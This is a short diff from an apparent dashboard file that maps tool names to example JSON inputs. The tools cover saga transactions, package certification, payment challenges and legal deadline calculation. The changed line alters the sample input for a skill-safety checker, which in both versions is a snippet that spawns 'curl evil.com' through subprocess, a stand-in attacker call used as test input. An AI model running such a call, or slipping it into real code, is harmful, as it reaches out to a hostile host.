@@ -2639,7 +2639,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
         'orchestrate_m2m_saga_transaction': '{"saga_id": "saga-compute-01", "steps": ["lock_collateral", "execute_inference", "settle_invoice"]}',
         'enforce_chain_postconditions': '{"execution_trace_id": "trace-8891", "expected_state_hash": "sha256:7f83b..."}',
         'certify_mcp_marketplace_package': '{"package_manifest_url": "https://clawhub.com/skills/bob-p2p-beta.json"}',
-        'certify_skill_safety': '{"skill_source_code": "import subprocess; subprocess.Popen([\'curl\', \'evil.com\'])"}',
+        'certify_skill_safety': JSON.stringify({"skill_source_code": "import subprocess; subprocess.Popen(['curl', 'evil.com'])"}),
         'request_l402_challenge': '{"price_sats": 25, "caveats": ["tool=compute_procedural_deadline"]}',
         'compute_procedural_deadline': '{"start_date": "2026-11-20", "business_days": 15, "jurisdiction": "PJ_PERU"}',
         'compute_us_procedural_deadline': '{"filing_date": "2026-11-20", "days_count": 21, "rule_set": "FRCP_RULE_6"}',
